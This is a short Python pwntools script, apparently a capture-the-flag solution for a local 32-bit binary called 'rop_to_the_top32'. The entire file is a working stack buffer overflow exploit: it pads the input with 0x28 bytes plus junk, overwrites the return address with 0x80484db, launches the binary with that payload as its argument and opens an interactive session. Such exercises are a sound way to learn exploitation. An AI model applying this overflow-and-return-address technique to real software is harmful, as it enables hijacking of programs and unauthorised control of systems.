from pwn import *
import time
import sys


def exploit():
    raw_input('wait')
    buf = 'A' * 0x28
    buf += 'JUNK'
    buf += p32(0x80484db)
    return buf


if __name__ == '__main__':
    payload = exploit()
    proc = process(['./rop_to_the_top32', payload], env={'LD_LIBRARY_PATH': './'})
    proc.interactive()
